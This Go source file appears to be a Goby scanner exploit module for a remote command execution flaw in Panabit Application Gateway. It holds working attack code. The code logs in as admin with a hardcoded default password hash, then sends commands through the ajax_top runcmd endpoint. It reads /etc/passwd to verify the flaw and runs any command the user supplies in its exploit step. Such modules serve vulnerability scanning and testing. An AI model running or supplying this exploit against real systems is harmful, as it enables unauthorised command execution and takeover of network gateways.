package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "Panabit Application Gateway ajax_top backstage RCE",
  "Description": "Panabit Application Gateway ajax_top backstage RCE",
  "Product": "Panabit Application Gateway",
  "Homepage": "https://www.panabit.com/",
  "DisclosureDate": "2021-05-18",
  "Author": "PeiQi",
  "GobyQuery": "(app=\"Apache-Web-Server\" && body=\"pa_row pa_recheck\")",
  "Level": "3",
  "Impact": "RCE",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "Cmd",
      "type": "input",
      "value": "cat /etc/passwd"
    }
  ],
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "",
        "data_type": "text",
        "follow_redirect": true,
        "method": "GET",
        "uri": "/"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    }
  ],
  "ExploitSteps": null,
  "Tags": ["RCE"],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["Panabit Application Gateway"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    uri_1 := "/login/userverify.cgi"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg_1.Data = "action=user_login&palang=ch&username=admin&password=722289d072731e2cc73038aa9ad9e067&code="
			if resp, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
        		if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Auth_OK") {
        		    cookie := resp.Header.Get("Set-Cookie")
        		    uri_2 := "/cgi-bin/Maintain/ajax_top?action=runcmd&cmd=cat%20/etc/passwd"
        			cfg_2 := httpclient.NewPostRequestConfig(uri_2)
        			cfg_2.VerifyTls = false
        			cfg_2.FollowRedirect = false
        			cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
        			cfg_2.Header.Store("Cookie", cookie)
        			if resp, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
        			    return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "root:")
        			}
        		}
        	}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri_1 := "/login/userverify.cgi"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg_1.Data = "action=user_login&palang=ch&username=admin&password=722289d072731e2cc73038aa9ad9e067&code="
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
        		if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Auth_OK") {
        		    cmd := strings.Replace(ss.Params["Cmd"].(string), " ", "%20", -1)
        		    cookie := resp.Header.Get("Set-Cookie")
        		    uri_2 := "/cgi-bin/Maintain/ajax_top?action=runcmd&cmd=" + cmd
        			cfg_2 := httpclient.NewPostRequestConfig(uri_2)
        			cfg_2.VerifyTls = false
        			cfg_2.FollowRedirect = false
        			cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
        			cfg_2.Header.Store("Cookie", cookie)
        			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_2); err == nil {
        			    expResult.Output = resp.Utf8Html
            		    expResult.Success = true
        			}
        		}
        	}
			return expResult
		},
	))
}